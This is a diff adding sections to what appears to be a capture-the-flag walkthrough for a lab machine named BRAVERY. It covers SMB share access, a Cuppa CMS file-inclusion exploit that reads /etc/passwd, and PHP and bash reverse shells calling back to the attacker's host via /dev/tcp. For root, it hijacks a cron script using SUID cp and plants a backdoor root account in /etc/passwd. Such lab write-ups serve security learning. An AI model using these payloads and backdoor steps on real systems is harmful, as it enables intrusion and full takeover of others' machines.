@@ -718,4 +718,278 @@ Password for root@//10.0.88.36/anonymous:
 /mnt/smb/readme.txt
 ```
 
+┌──(root㉿kali)-[~]
+└─# smbclient -U david%qwertyuioplkjhgfdsazxcvbnm //10.0.88.36/secured
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Fri Sep 28 21:52:14 2018
+  ..                                  D        0  Fri Jun 15 00:30:39 2018
+  david.txt                           N      376  Sat Jun 16 16:36:07 2018
+  genevieve.txt                       N      398  Tue Jul 24 00:51:27 2018
+  README.txt                          N      323  Tue Jul 24 09:58:53 2018
+
+                17811456 blocks of size 1024. 13155336 blocks available
+smb: \> ^C
+
+┌──(root㉿kali)-[~]
+└─# mkdir /mnt/smb2
+
+┌──(root㉿kali)-[~]
+└─# mount -t cifs -o username=david,password=qwertyuioplkjhgfdsazxcvbnm //10.0.88.36/secured /mnt/smb2
+
+┌──(root㉿kali)-[~]
+└─# tail -n +1 /mnt/smb2/*
+==> /mnt/smb2/david.txt <==
+I have concerns over how the developers are designing their webpage. The use of "developmentsecretpage" is too long and unwieldy. We should cut short the addresses in our local domain.
+
+1. Reminder to tell Patrick to replace "developmentsecretpage" with "devops".
+
+2. Request the intern to adjust her Favourites to http://<developmentIPandport>/devops/directortestpagev1.php.
+
+==> /mnt/smb2/genevieve.txt <==
+Hi! This is Genevieve!
+
+We are still trying to construct our department's IT infrastructure; it's been proving painful so far.
+
+If you wouldn't mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We're trying to establish quite a few things:
+
+a) File-share to our director.
+b) Setting up our CMS.
+c) Requesting for a HIDS solution to secure our host.
+
+==> /mnt/smb2/README.txt <==
+README FOR THE USE OF THE BRAVERY MACHINE:
+
+Your use of the BRAVERY machine is subject to the following conditions:
+
+1. You are a permanent staff in Good Tech Inc.
+2. Your rank is HEAD and above.
+3. You have obtained your BRAVERY badges.
+
+For more enquiries, please log into the CMS using the correct magic word: goodtech.
 </details>
+
+# 3. Targeting the Cuppa CMS
+
+Cuppa CMS has a [local/remote file inclusion exploit](https://www.exploit-db.com/exploits/25971)
+
+<details>
+  <summary><h2>3.1. Testing the exploit to read <code>/etc/passwd</code></h2></summary>
+
+```console
+┌──(root㉿kali)-[~]
+└─# curl http://10.0.88.36/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+<script>
+        function CloseDefaultAlert(){
+                SetAlert(false, "", "#alert");
+                setTimeout(function () {SetBlockade(false)}, 200);
+        }
+        function ShowAlert(){
+                _width = '';
+                _height = '';
+                jQuery('#alert').animate({width:parseInt(_width), height:parseInt(_height), 'margin-left':-(parseInt(_width)*0.5)+20, 'margin-top':-(parseInt(_height)*0.5)+20 }, 300, "easeInOutCirc", CompleteAnimation);
+                        function CompleteAnimation(){
+                                jQuery("#btnClose_alert").css('visibility', "visible");
+                                jQuery("#description_alert").css('visibility', "visible");
+                                jQuery("#content_alert").css('visibility', "visible");
+                        }
+        }
+</script>
+<div class="alert_config_field" id="alert" style="z-index:;">
+    <div class="btnClose_alert" id="btnClose_alert" onclick="javascript:CloseDefaultAlert();"></div>
+        <div class="description_alert" id="description_alert"><b>Field configuration: </b></div>
+    <div class="separator" style="margin-bottom:15px;"></div>
+    <div id="content_alert" class="content_alert">
+        root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+david:x:1000:1000:david:/home/david:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+geoclue:x:997:995:User for geoclue:/var/lib/geoclue:/sbin/nologin
+mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
+nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+libstoragemgmt:x:995:991:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
+gluster:x:994:990:GlusterFS daemons:/var/run/gluster:/sbin/nologin
+unbound:x:993:989:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+qemu:x:107:107:qemu user:/:/sbin/nologin
+usbmuxd:x:113:113:usbmuxd user:/:/sbin/nologin
+rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
+colord:x:992:988:User for colord:/var/lib/colord:/sbin/nologin
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
+pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
+sssd:x:990:984:User for sssd:/:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+radvd:x:75:75:radvd user:/:/sbin/nologin
+gdm:x:42:42::/var/lib/gdm:/sbin/nologin
+setroubleshoot:x:989:983::/var/lib/setroubleshoot:/sbin/nologin
+gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
+ossec:x:1001:1002::/var/ossec:/sbin/nologin
+ossecm:x:1002:1002::/var/ossec:/sbin/nologin
+ossecr:x:1003:1002::/var/ossec:/sbin/nologin
+rick:x:1004:1004::/home/rick:/bin/bash
+    </div>
+</div>
+```
+
+</details>
+
+## 3.2. Getting a reverse shell using remote file inclusion
+
+Setup php reverse shell on Kali `/var/www/html/reverse.txt`
+
+☝️ To use PHP reverse shell on RFI, save the file on Kali as `.txt`, not `.php`; otherwise, it will be Kali that is connecting to itself
+
+```console
+<?php print exec("/bin/bash -c 'bash -i >/dev/tcp/192.168.17.10/4444 0>&1'"); ?>
+```
+
+Start listener in Kali: `rlwrap nc -nlvp 4444`
+
+Load the reverse shell: `curl http://10.0.88.36/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.17.10/reverse.txt`
+
+```console
+connect to [192.168.17.10] from (UNKNOWN) [10.0.88.36] 53190
+python -c 'import pty;pty.spawn("/bin/bash")'
+bash-4.2$ whoami
+whoami
+apache
+bash-4.2$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+```
+
+Got the `/local.txt`:
+
+```console
+bash-4.2$ cat /local.txt
+cat /local.txt
+Congratulations on obtaining a user shell. :)
+```
+
+# 4. Privilege Escalation
+
+Running `linpeas.sh` revealed some **Interesting Files**:
+1. `suid` on `cp`
+2. `maintenance.sh` script at `/var/www`
+
+```console
+⋮
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
+                               ╚═══════════════════╝
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+-rwsr-xr-x. 1 root root 152K Apr 11  2018 /usr/bin/cp
+⋮
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/
+/root/
+/var/www
+/var/www/cgi-bin
+/var/www/maintenance.sh
+⋮
+```
+
+This provides 2 methods to get root
+
+## Option 1: Tweak and replace the maintenance script
+
+The maintenance script appears to be run by cron job as `root` to update the `/var/www/html/README.html` file periodically
+
+```console
+bash-4.2$ ls -l /var/www/maintenance.sh
+ls -l /var/www/maintenance.sh
+-rw-r--r--. 1 root root 130 Jun 23  2018 /var/www/maintenance.sh
+bash-4.2$ cat /var/www/maintenance.sh
+cat /var/www/maintenance.sh
+#!/bin/sh
+
+rm /var/www/html/README.txt
+echo "Try harder!" > /var/www/html/README.txt
+chown apache:apache /var/www/html/README.txt
+```
+
+The `apache` user doesn't have permission to write to the `maintenance.sh` file, but `cp` has `SUID` set to run as root
+
+i.e. We can replace the file with a reverse shell executable and it should hook back to Kali when the cron job runs
+
+Prepare the reverse shell script on Kali
+
+```console
+cat << EOF >> /var/www/html/reverse.sh
+#!/bin/sh
+/bin/bash -c 'bash -i >& /dev/tcp/192.168.17.10/4445 0>&1'
+EOF
+```
+
+Download the reverse shell: `curl -O http://192.168.17.10/reverse.sh`
+
+Start listener in Kali: `rlwrap nc -nlvp 4445`
+
+Replace the `maintenance.sh` with reverse shell: `cp reverse.sh /var/www/maintenance.sh`
+
+Wait for the cron job to run and hook to the listener
+
+```console
+connect to [192.168.17.10] from (UNKNOWN) [10.0.88.36] 54158
+bash: no job control in this shell
+[root@bravery ~]# cat proof.txt
+cat proof.txt
+Congratulations on rooting BRAVERY. :)
+```
+
+We can also verify that the cron job is configured to run every 5 minutes:
+
+```console
+[root@bravery ~]# crontab -l
+crontab -l
+*/5 * * * * /bin/sh /var/www/maintenance.sh
+```
+
+## Option 2: Create a backdoor user
+
+Create a copy of `/etc/passwd`: `tail -n +1 /etc/passwd >> passwd`
+
+Generate password hash for backdoor user: `openssl passwd -1 -salt 12345678 password`
+
+Add entry to passwd copy: `echo 'backdoor:$1$12345678$o2n/JiO/h5VviOInWJ4OQ/:0:0:root:/root:/bin/bash' >> passwd`
+
+Replace `/etc/passwd` with edited copy: `cp passwd /etc/passwd`
+
+su to backdoor user and get root:
+
+```console
+bash-4.2$ su backdoor
+su backdoor
+Password: password
+
+ABRT has detected 1 problem(s). For more info run: abrt-cli list --since 1545797712
+[root@bravery alerts]# cd ~
+cd ~
+[root@bravery ~]# cat proof.txt
+cat proof.txt
+Congratulations on rooting BRAVERY. :)
+```
